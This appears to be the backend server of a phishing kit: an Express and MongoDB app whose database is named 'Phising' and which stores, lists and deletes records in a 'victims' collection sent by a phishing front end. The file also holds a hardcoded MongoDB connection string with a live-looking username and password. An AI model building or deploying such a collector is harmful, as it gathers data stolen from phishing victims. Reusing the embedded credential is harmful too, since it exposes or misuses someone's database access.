const express = require('express');
const cors = require('cors');
const app = express();
const port = process.env.port || 5000;
const { MongoClient, ServerApiVersion, ObjectId } = require('mongodb');


 

// middleware 

app.use(cors());
app.use(express.json());





const uri = "mongodb+srv://Phising:SzA198qdUDXgYMHQ@cluster0.wss65wz.mongodb.net/?retryWrites=true&w=majority";
// console.log(uri);
// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
     serverApi: {
          version: ServerApiVersion.v1,
          strict: true,
          deprecationErrors: true,
     }
});

async function run() {
     try {

          const victimsCollection = client.db('Phising').collection('victims');

          app.post('/victims', async (req, res) => {
               const post = req.body;
               const result = await victimsCollection.insertOne(post);
               res.send(result);
          })

          app.get('/victims', async (req, res) => {

               const query = {};
               const result = await victimsCollection.find(query).toArray();
               res.send(result);

          })

          app.delete('/victims/:id', async (req, res) => {
               const id = req.params.id;
               const filter = { _id: new ObjectId(id) }
               const result = await victimsCollection.deleteOne(filter)
               res.send(result)
          })

     } finally {

     }
}
run().catch(err => console.log(err))


app.get('/', async (req, res) => {
     res.send('Phis server is running')
})

app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
});